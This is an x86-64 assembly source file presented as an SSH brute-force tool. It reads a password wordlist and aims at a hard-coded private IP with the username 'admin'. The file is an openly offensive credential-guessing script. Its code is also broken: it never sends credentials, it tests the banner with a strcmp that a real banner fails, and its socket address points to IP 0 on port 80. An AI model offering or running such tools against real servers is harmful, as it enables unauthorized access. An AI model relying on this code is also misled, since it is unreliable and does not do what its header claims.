; SSH Brute Force in Assembly (x86-64 Linux)
; Requires: nasm -f elf64 ssh_brute.asm && ld ssh_brute.o -o ssh_brute

section .data
    host db "192.168.1.100", 0
    port db "22", 0
    user db "admin", 0
    wordlist_file db "passwords.txt", 0
    success_msg db "[SUCCESS] ", 0
    not_found_msg db "No valid credentials found", 0
    newline db 10
    colon db ":"

section .bss
    buffer resb 1024
    password resb 100
    file_handle resq 1

section .text
    global _start

_start:
    ; Open wordlist file
    mov rax, 2                  ; sys_open
    mov rdi, wordlist_file
    mov rsi, 0                  ; O_RDONLY
    mov rdx, 0                  ; mode
    syscall
    
    cmp rax, 0
    jl exit_error
    mov [file_handle], rax

read_passwords:
    ; Read password from file
    mov rax, 0                  ; sys_read
    mov rdi, [file_handle]
    mov rsi, password
    mov rdx, 100
    syscall
    
    cmp rax, 0
    jle not_found
    
    ; Remove newline
    mov rdi, password
    add rdi, rax
    dec rdi
    mov byte [rdi], 0
    
    ; Try SSH connection
    call try_ssh
    
    ; If successful, print and exit
    cmp rax, 1
    je success
    
    jmp read_passwords

try_ssh:
    ; Create socket
    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 1                  ; SOCK_STREAM
    mov rdx, 0                  ; protocol
    syscall
    
    cmp rax, 0
    jl return_failure
    mov r12, rax                ; save socket fd
    
    ; Connect to SSH port
    mov rax, 42                 ; sys_connect
    mov rdi, r12                ; socket fd
    mov rsi, sockaddr
    mov rdx, 16
    syscall
    
    cmp rax, 0
    jl close_socket
    
    ; Simple SSH protocol check
    mov rax, 0                  ; sys_read
    mov rdi, r12
    mov rsi, buffer
    mov rdx, 1024
    syscall
    
    ; Check if SSH response
    mov rdi, buffer
    mov rsi, ssh_banner
    call strcmp
    
    cmp rax, 0
    jne close_socket
    
    ; Success
    mov rax, 1
    jmp return_success

close_socket:
    mov rax, 3                  ; sys_close
    mov rdi, r12
    syscall

return_failure:
    mov rax, 0
    ret

return_success:
    mov rax, 1
    ret

success:
    ; Print success message
    mov rax, 1                  ; sys_write
    mov rdi, 1                  ; stdout
    mov rsi, success_msg
    mov rdx, 11
    syscall
    
    ; Print username
    mov rax, 1
    mov rdi, 1
    mov rsi, user
    mov rdx, 5
    syscall
    
    ; Print colon
    mov rax, 1
    mov rdi, 1
    mov rsi, colon
    mov rdx, 1
    syscall
    
    ; Print password
    mov rax, 1
    mov rdi, 1
    mov rsi, password
    mov rdx, 100
    call strlen
    syscall
    
    ; Print newline
    mov rax, 1
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    syscall
    
    jmp exit_success

not_found:
    ; Print not found message
    mov rax, 1
    mov rdi, 1
    mov rsi, not_found_msg
    mov rdx, 25
    syscall
    jmp exit_success

exit_success:
    mov rax, 60                 ; sys_exit
    mov rdi, 0
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1
    syscall

; Helper functions
strlen:
    xor rcx, rcx
.loop:
    cmp byte [rsi + rcx], 0
    je .done
    inc rcx
    jmp .loop
.done:
    mov rdx, rcx
    ret

strcmp:
    xor rcx, rcx
.loop:
    mov al, [rdi + rcx]
    mov bl, [rsi + rcx]
    cmp al, bl
    jne .not_equal
    cmp al, 0
    je .equal
    inc rcx
    jmp .loop
.not_equal:
    mov rax, 1
    ret
.equal:
    xor rax, rax
    ret

; Data structures
section .data
ssh_banner db "SSH-", 0
sockaddr:
    dw 2                       ; AF_INET
    dw 0x5000                 ; port 80 (example)
    dd 0                       ; IP address
    dd 0                       ; padding
